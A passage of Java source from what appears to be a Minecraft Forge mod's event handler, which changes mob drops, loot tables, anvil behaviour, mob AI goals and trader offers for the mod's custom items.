    private void addCursedModifier(LivingEntity entity, Attribute attribute, AttributeModifier modifier) {
        AttributeInstance instance = entity.getAttribute(attribute);
        if (instance != null) {
            instance.removePermanentModifier(modifier.getId());
            instance.addPermanentModifier(modifier);
        }
    }

    @SubscribeEvent
    public void onXPOrb(PlayerXpEvent.PickupXp event) {
        Player player = event.getEntity();
        if (SuperpositionHandler.hasItem(player, CURSED_XP_SCROLL) || SuperpositionHandler.hasCurio(player, CURSED_XP_SCROLL)) {
            ExperienceOrb orb = event.getOrb();
            orb.value = orb.getValue() / 5;
        }
    }

    @SubscribeEvent
    public void miningStuff(PlayerEvent.BreakSpeed event) {
        Player player = event.getEntity();
        float miningModifier = 0.0F;
        if (SuperpositionHandler.hasCurio(player, EARTH_PROMISE)) {
            miningModifier += EarthPromise.breakSpeedBonus.getValue().asModifier();
        }

        event.setNewSpeed(event.getOriginalSpeed() * miningModifier + event.getNewSpeed());

        if (SuperpositionHandler.hasCurio(player, ADVENTURE_CHARM) && !(player.isCrouching() && AdventureCharm.shiftEnable.getValue())) {
            event.setCanceled(true);
        }
        if (SuperpositionHandler.hasCurio(player, DESPAIR_INSIGNIA)) {
            event.setCanceled(true);
        }
    }

    @SubscribeEvent
    public void onItemCrafted(PlayerEvent.ItemCraftedEvent event) {
        Player player = event.getEntity();
        if (player != null && !player.level().isClientSide) {
            if (event.getInventory().countItem(BLESS_AMPLIFIER) == 1 || event.getCrafting().getItem() == BLESS_STONE) {
                player.level().playSound(null, player.blockPosition(), SoundEvents.ENCHANTMENT_TABLE_USE, SoundSource.PLAYERS, 1.0F, (float) (0.9F + (Math.random() * 0.1F)));
            }
        }
        if (player != null && !player.level().isClientSide) {
            if (event.getInventory().countItem(EnigmaticItems.ABYSSAL_HEART) > 0 && EnigmaticAddons.Acceptors.contains(player.getUUID())) {
                if (!SuperpositionHandler.getPersistentBoolean(player, "AbyssKnightExtra", false)) {
                    Block.popResource(player.level(), player.blockPosition(), EnigmaticItems.ABYSSAL_HEART.getDefaultInstance());
                    SuperpositionHandler.setPersistentBoolean(player, "AbyssKnightExtra", true);
                }
            }
        }
    }

    @SubscribeEvent
    public void onAnvilChange(AnvilUpdateEvent event) {
        Player player = event.getPlayer();
        ItemStack left = event.getLeft();
        ItemStack right = event.getRight();
        if (!left.isEmpty() && !right.isEmpty()) {
            ItemStack copy = left.copy();
            if (player != null && FORGER_GEM.isPresent(player) && SuperAddonHandler.isOKOne(player)) {
                boolean check = left.isDamageableItem() && !ForgerGem.blackList.contains(ForgeRegistries.ITEMS.getKey(left.getItem()));
                if (check && ForgerGem.strictUnbreakableForge.getValue()) {
                    check = left.isRepairable() && (left.getItem() instanceof TieredItem || left.getItem() instanceof ArmorItem);
                }
                if (player.getAbilities().instabuild && left.isDamageableItem()) check = true;
                if (left.is(right.getItem()) && check && left.getDamageValue() == 0 && right.getDamageValue() == 0 && !left.isEnchanted() && !right.isEnchanted()) {
                    copy = left.copy();
                    copy.addTagElement("Unbreakable", ByteTag.valueOf(true));
                    copy.setRepairCost(copy.getBaseRepairCost() + 8);
                    if (!event.getName().isEmpty()) copy.setHoverName(Component.literal(event.getName()));
                    event.setOutput(copy);
                    event.setCost(30);
                }
            }

            if (left.is(TOTEM_OF_MALICE) && right.is(EnigmaticItems.EVIL_ESSENCE)) {
                int maxLevel = left.getEnchantmentLevel(Enchantments.UNBREAKING) + 2;
                if (TotemOfMalice.getTotemPower(left) < maxLevel) {
                    TotemOfMalice.setTotemPower(copy, maxLevel);
                    int specialCost = TotemOfMalice.getSpecialCost(left);
                    copy.setRepairCost(copy.getBaseRepairCost() + 2 + specialCost);
                    TotemOfMalice.setSpecialCost(copy, specialCost + 1);
                    event.setOutput(copy);
                    event.setCost(1 + copy.getBaseRepairCost() + specialCost - 2);
                    event.setMaterialCost(1);
                }
            }
        }
    }

    @SubscribeEvent
    public void onAnvilRepair(AnvilRepairEvent event) {
        Player player = event.getEntity();
        if (player != null && !player.level().isClientSide && SuperpositionHandler.hasCurio(player, FORGER_GEM)) {
            event.setBreakChance(event.getBreakChance() / 6);
        }
    }

    @SubscribeEvent(priority = EventPriority.NORMAL)
    public void onLivingDrops(LivingDropsEvent event) {
        DamageSource source = event.getSource();
        if (event.isRecentlyHit() && source != null && source.getEntity() instanceof Player player && (SuperpositionHandler.isTheCursedOne(player) || BlessRing.Helper.specialLooting(player))) {
            LivingEntity killed = event.getEntity();
            BlockPos blockPos = killed.blockPosition();
            int lootingLevel = ForgeHooks.getLootingLevel(killed, player, source);
            if (killed.level().dimension() == EnigmaticLegacy.PROXY.getOverworldKey() && !killed.level().canSeeSky(blockPos)) {
                if (blockPos.getY() <= 0 && killed instanceof Monster && RANDOM.nextInt(1000) < 30 + lootingLevel * 15) {
                    this.addDrop(event, new ItemStack(EARTH_HEART_FRAGMENT));
                }
            }

            if (!CursedRing.enableSpecialDrops.getValue() || !player.level().getGameRules().getBoolean(GameRules.RULE_DOMOBLOOT))
                return;
            if (OmniconfigAddonHandler.isItemEnabled(ICHOR_DROPLET)) {
                this.addEntityDropWithChance(event, Ghast.class, new ItemStack(ICHOR_DROPLET), 60);
                this.addEntityDropWithChance(event, Ghast.class, new ItemStack(ICHOR_DROPLET), 40);
            }

            if (BlessRing.Helper.specialLooting(player)) {
                if (killed.getClass() == Shulker.class) {
                    this.addDropWithChance(event, new ItemStack(EnigmaticItems.ASTRAL_DUST, 1), 20);
                } else if (killed.getClass() == Skeleton.class || killed.getClass() == Stray.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.ARROW, 3, 15));
                } else if (killed.getClass() == Zombie.class || killed.getClass() == Husk.class) {
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.SLIME_BALL, 1, 3), 25);
                } else if (killed.getClass() == Spider.class || killed.getClass() == CaveSpider.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.STRING, 2, 12));
                } else if (killed.getClass() == Guardian.class) {
                    this.addDropWithChance(event, new ItemStack(Items.NAUTILUS_SHELL, 1), 15);
                    this.addDrop(event, this.getRandomSizeStack(Items.PRISMARINE_CRYSTALS, 2, 5));
                } else if (killed instanceof ElderGuardian) {
                    this.addDrop(event, this.getRandomSizeStack(Items.PRISMARINE_CRYSTALS, 4, 16));
                    this.addDrop(event, this.getRandomSizeStack(Items.PRISMARINE_SHARD, 7, 28));
                    this.addOneOf(event,
                            new ItemStack(Items.HEART_OF_THE_SEA, 1),
                            new ItemStack(Items.ENCHANTED_GOLDEN_APPLE, 1),
                            new ItemStack(Items.ENDER_EYE, 1),
                            EnchantmentHelper.enchantItem(killed.getRandom(), new ItemStack(Items.TRIDENT, 1), 25 + RANDOM.nextInt(15), true));
                } else if (killed.getClass() == EnderMan.class) {
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.ENDER_EYE, 1, 2), 40);
                } else if (killed.getClass() == Blaze.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.BLAZE_POWDER, 0, 5));
                } else if (killed.getClass() == ZombifiedPiglin.class) {
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.GOLD_INGOT, 1, 3), 40);
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.GLOWSTONE_DUST, 1, 7), 30);
                } else if (killed.getClass() == Witch.class) {
                    this.addDropWithChance(event, new ItemStack(Items.GHAST_TEAR, 1), 30);
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.PHANTOM_MEMBRANE, 1, 3), 50);
                } else if (killed.getClass() == Pillager.class || killed.getClass() == Vindicator.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.EMERALD, 0, 4));
                } else if (killed.getClass() == Villager.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.EMERALD, 2, 6));
                } else if (killed.getClass() == Creeper.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.GUNPOWDER, 4, 12));
                } else if (killed.getClass() == PiglinBrute.class) {
                    this.addDropWithChance(event, new ItemStack(Items.NETHERITE_SCRAP, 1), 20);
                } else if (killed.getClass() == Evoker.class) {
                    this.addDrop(event, new ItemStack(Items.TOTEM_OF_UNDYING, 1));
                    this.addDrop(event, this.getRandomSizeStack(Items.EMERALD, 5, 20));
                    this.addDropWithChance(event, new ItemStack(Items.ENCHANTED_GOLDEN_APPLE, 1), 10);
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.ENDER_PEARL, 1, 3), 30);
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.BLAZE_ROD, 2, 4), 30);
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.EXPERIENCE_BOTTLE, 4, 10), 50);
                } else if (killed.getClass() == WitherSkeleton.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.BLAZE_POWDER, 0, 3));
                    this.addDropWithChance(event, new ItemStack(Items.GHAST_TEAR, 1), 20);
                    this.addDropWithChance(event, new ItemStack(Items.NETHERITE_SCRAP, 1), 7);
                } else if (killed.getClass() == Ghast.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.PHANTOM_MEMBRANE, 1, 4));
                } else if (killed.getClass() == Drowned.class) {
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.LAPIS_LAZULI, 1, 3), 30);
                } else if (killed.getClass() == Vex.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.GLOWSTONE_DUST, 0, 2));
                    this.addDropWithChance(event, new ItemStack(Items.PHANTOM_MEMBRANE, 1), 30);
                } else if (killed.getClass() == Piglin.class) {
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.GOLD_INGOT, 2, 4), 50);
                } else if (killed.getClass() == Ravager.class) {
                    this.addDrop(event, this.getRandomSizeStack(Items.EMERALD, 3, 10));
                    this.addDrop(event, this.getRandomSizeStack(Items.LEATHER, 2, 7));
                    this.addDropWithChance(event, this.getRandomSizeStack(Items.DIAMOND, 0, 4), 50);
                } else if (killed.getClass() == MagmaCube.class) {
                    this.addDropWithChance(event, new ItemStack(Items.BLAZE_POWDER, 1), 50);
                } else if (killed.getClass() == Chicken.class) {
                    this.addDropWithChance(event, new ItemStack(Items.EGG, 1), 50);
                }
            }
        }
    }

    @SubscribeEvent(priority = EventPriority.LOWEST)
    public void onLootTablesLoaded(LootTableLoadEvent event) {
        if (!OmniconfigHandler.customDungeonLootEnabled.getValue()) return;

        if (SuperAddonHandler.getIceDungeons().contains(event.getName())) {
            LootPool poolSpellstones = SuperpositionHandler.constructLootPool("addon_spellstones", -5F, 1F,
                    SuperAddonHandler.createOptionalLootEntry(FORGOTTEN_ICE, 20));

            LootTable modified = event.getTable();
            modified.addPool(poolSpellstones);
            event.setTable(modified);
        }
        if (SuperAddonHandler.getLeafDungeons().contains(event.getName())) {
            LootPool poolSpellstones = SuperpositionHandler.constructLootPool("addon_spellstones", -5F, 1F,
                    SuperAddonHandler.createOptionalLootEntry(REVIVAL_LEAF, 50));

            LootTable modified = event.getTable();
            modified.addPool(poolSpellstones);
            event.setTable(modified);
        }
        if (SuperAddonHandler.getEngineDungeons().contains(event.getName())) {
            LootPool poolSpellstones = SuperpositionHandler.constructLootPool("addon_spellstones", -15F, 1F,
                    SuperAddonHandler.createOptionalLootEntry(LOST_ENGINE, 75));

            LootTable modified = event.getTable();
            modified.addPool(poolSpellstones);
            event.setTable(modified);
        }
        if (SuperAddonHandler.getSoulDungeons().contains(event.getName())) {
            LootPool poolCharms = SuperpositionHandler.constructLootPool("addon_spellstones", -14F, 1F,
                    SuperAddonHandler.createOptionalLootEntry(ILLUSION_LANTERN, 75));

            LootTable modified = event.getTable();
            modified.addPool(poolCharms);
            event.setTable(modified);
        }
        if (SuperpositionHandler.getEnderDungeons().contains(event.getName())) {
            LootPool poolSpellstones = SuperpositionHandler.constructLootPool("addon_spellstones", -13F, 1F,
                    SuperpositionHandler.createOptionalLootEntry(EnigmaticItems.ASTRAL_DUST, 82),
                    SuperpositionHandler.createOptionalLootEntry(EnigmaticItems.VOID_PEARL, 18));

            LootTable modified = event.getTable();
            modified.addPool(poolSpellstones);
            event.setTable(modified);
        }
        if (SuperpositionHandler.getOverworldDungeons().contains(event.getName())) {
            LootPool antiqueLegacy = SuperpositionHandler.constructLootPool("addon_legacy", -10F, 1F,
                    SuperAddonHandler.createOptionalLootEntry(ARTIFICIAL_FLOWER, 10),
                    SuperAddonHandler.createOptionalLootEntry(ANTIQUE_BAG, 20),
                    SuperAddonHandler.createOptionalLootEntry(FORGER_GEM, 35));

            LootTable modified = event.getTable();
            modified.addPool(antiqueLegacy);
            event.setTable(modified);
        }
        if (SuperpositionHandler.getNetherDungeons().contains(event.getName())) {
            LootPool ichor = SuperpositionHandler.constructLootPool("ichor", -6F, 2F,
                    SuperAddonHandler.createOptionalLootEntry(ICHOR_DROPLET, 75, 1, 3));

            LootTable modified = event.getTable();
            modified.addPool(ichor);
            event.setTable(modified);
        }
    }

    @SubscribeEvent(priority = EventPriority.HIGHEST)
    public void onLootTablesPreLoaded(@NotNull LootTableLoadEvent event) {
        LootTable modified = event.getTable();
        if (SuperpositionHandler.getOverworldDungeons().contains(event.getName())) {
            LootPool earth_bonus = SuperpositionHandler.constructLootPool("earth_bonus", -1F, 1F,
                    SuperpositionHandler.getWaterDungeons().contains(event.getName()) || event.getName().equals(BuiltInLootTables.PILLAGER_OUTPOST) ? null : SuperAddonHandler.createOptionalLootEntry(EARTH_HEART_FRAGMENT, 50, 1, 2)
            );
            modified.addPool(earth_bonus);
            event.setTable(modified);
        }
    }

    @SubscribeEvent
    public void onEntityJoinWorld(EntityJoinLevelEvent event) {
        if (!OmniconfigAddonHandler.EnableCurseBoost.getValue()) return;
        Entity entity = event.getEntity();
        Predicate<WrappedGoal> meleeOrBow = ((goal) -> goal.getGoal() instanceof MeleeAttackGoal || goal.getGoal() instanceof RangedCrossbowAttackGoal<?> || goal.getGoal() instanceof RangedBowAttackGoal<?>);
        int priority;
        if (entity instanceof Spider spider) {
            priority = getGoalPriority(spider, meleeOrBow);
            if (priority >= 0)
                spider.goalSelector.addGoal(priority, new SpiderRangedAttackGoal(spider, 0.5F, 30, 8.0F));
        }
        if (entity instanceof Pillager pillager) {
            priority = getGoalPriority(pillager, (goal) -> goal.getGoal() instanceof RangedCrossbowAttackGoal) - 1;
            if (priority >= 0)
                pillager.goalSelector.addGoal(priority, new CrossbowBlazeAttackGoal<>(pillager, 1.05, 8.5F));
        }
        if (entity instanceof AbstractIllager illager) {
            priority = getGoalPriority(illager, meleeOrBow) - 1;
            if (priority >= 0) illager.goalSelector.addGoal(priority, new LeapAttackGoal(illager, 0.5D));
        }
        if (entity instanceof Zombie zombie) {
            priority = getGoalPriority(zombie, meleeOrBow) - 1;
            if (priority >= 0) zombie.goalSelector.addGoal(priority, new LeapAttackGoal(zombie, 0.36D));
        }
        if (entity instanceof AbstractSkeleton skeleton) {
            priority = getGoalPriority(skeleton, meleeOrBow);
            if (priority >= 1) {
                skeleton.goalSelector.addGoal(priority - 1, new SkeletonMeleeAttackGoal(skeleton));
            }
        }
        if (entity instanceof Ghast ghast) {
            ghast.goalSelector.addGoal(7, new GhastMultishotGoal(ghast));
        }
        if (entity instanceof Animal animal) {
            animal.goalSelector.addGoal(5, new AvoidTheWorthyGoal(animal, 6.0F, 1.25, 1.25));
        }
        if (entity instanceof Vex vex) {
            if (vex.getOwner() != null && SuperAddonHandler.isCurseBoosted(vex.getOwner())) {
                SuperAddonHandler.setCurseBoosted(vex, true, null);
            }
        }
    }

    @SubscribeEvent
    public void onWandererTradesEvent(WandererTradesEvent event) {
        List<VillagerTrades.ItemListing> rareTrades = event.getRareTrades();
        rareTrades.add((trader, rand) -> new MerchantOffer(new ItemStack(EARTH_HEART_FRAGMENT), new ItemStack(Items.EMERALD, 20), new ItemStack(EnigmaticItems.EARTH_HEART), 1, 5, 0.2F));
        rareTrades.add((trader, rand) -> new MerchantOffer(new ItemStack(Items.EMERALD, 4), new ItemStack(EARTH_HEART_FRAGMENT), 2, 5, 0.25F));
    }

    private void ModifyDamageBaseOne(LivingHurtEvent event, double multiplier) {
        if (multiplier == 0) return;
        event.setAmount(event.getAmount() * (1.0F + (float) multiplier));
    }

    public ItemStack getRandomSizeStack(Item item, int minAmount, int maxAmount) {
        return new ItemStack(item, minAmount + RANDOM.nextInt(maxAmount - minAmount + 1));
    }

    public void addOneOf(LivingDropsEvent event, ItemStack... itemStacks) {
        int chosenStack = RANDOM.nextInt(itemStacks.length);
        this.addDrop(event, itemStacks[chosenStack]);
    }

    public void addDrop(LivingDropsEvent event, ItemStack drop) {
        ItemEntity itemEntity = new ItemEntity(event.getEntity().level(), event.getEntity().getX(), event.getEntity().getY(), event.getEntity().getZ(), drop);
        itemEntity.setPickUpDelay(10);
        event.getDrops().add(itemEntity);
    }

    public void addDropWithChance(LivingDropsEvent event, ItemStack drop, int chance) {
        if (RANDOM.nextInt(100) < chance) {
            this.addDrop(event, drop);
        }
    }

    public <T extends LivingEntity> void addEntityDropWithChance(LivingDropsEvent event, Class<T> entity, ItemStack drop, int chance) {
        if (entity == event.getEntity().getClass()) {
            this.addDropWithChance(event, drop, chance);
        }
    }

    @SubscribeEvent
    public void attachEntitiesCapabilities(AttachCapabilitiesEvent<Entity> event) {
        if (event.getObject() instanceof Player player) {
            event.addCapability(AntiqueBagCapability.ID_INVENTORY, AntiqueBagCapability.createProvider(player));
            event.addCapability(EtheriumShieldCapability.ID_ETHERIUM_SHIELD_DATA, EtheriumShieldCapability.createProvider());
        }
    }

    @SubscribeEvent
    public void onPlayerClone(PlayerEvent.Clone event) {
        Player player = event.getEntity();
        Player original = event.getOriginal();
        original.revive();
        if (SuperpositionHandler.isTheCursedOne(original))
            player.getPersistentData().putBoolean(BlessRing.CURSED_SPAWN, true);
        if (SuperAddonHandler.isTheBlessedOne(original))
            player.getPersistentData().putBoolean(BlessRing.BLESS_SPAWN, true);
        if (SuperpositionHandler.isTheWorthyOne(original))
            player.getPersistentData().putBoolean(BlessRing.WORTHY_SPAWN, true);
        LazyOptional<IAntiqueBagHandler> oldHandler = SuperAddonHandler.getCapability(original, AntiqueBagCapability.INVENTORY);
        LazyOptional<IAntiqueBagHandler> newHandler = SuperAddonHandler.getCapability(player, AntiqueBagCapability.INVENTORY);
        oldHandler.ifPresent(oldBag -> newHandler.ifPresent(newBag -> newBag.readTag(oldBag.writeTag())));

        var oldCounter = IPlaytimeCounter.get(original);
        var newCounter = IPlaytimeCounter.get(player);
        newCounter.deserializeNBT(oldCounter.serializeNBT());
    }

    @SubscribeEvent
    public void onLogOut(PlayerEvent.PlayerLoggedOutEvent event) {
        if (SuperpositionHandler.isTheCursedOne(event.getEntity())) {
            event.getEntity().getPersistentData().putBoolean(BlessRing.CURSED_SPAWN, true);
        }
        if (SuperpositionHandler.isTheWorthyOne(event.getEntity())) {
            event.getEntity().getPersistentData().putBoolean(BlessRing.WORTHY_SPAWN, true);
        }
        if (SuperAddonHandler.isTheBlessedOne(event.getEntity())) {
            event.getEntity().getPersistentData().putBoolean(BlessRing.BLESS_SPAWN, true);
        }
    }

    private boolean check() {
        int[] c = new int[]{101, 110, 105, 103, 109, 97, 116, 105, 99, 116, 119, 101, 97, 107};
        StringBuilder s = new StringBuilder();
        for (int aByte : c) s.append((char) (aByte));
        return ModList.get().isLoaded(s.toString());
    }
}
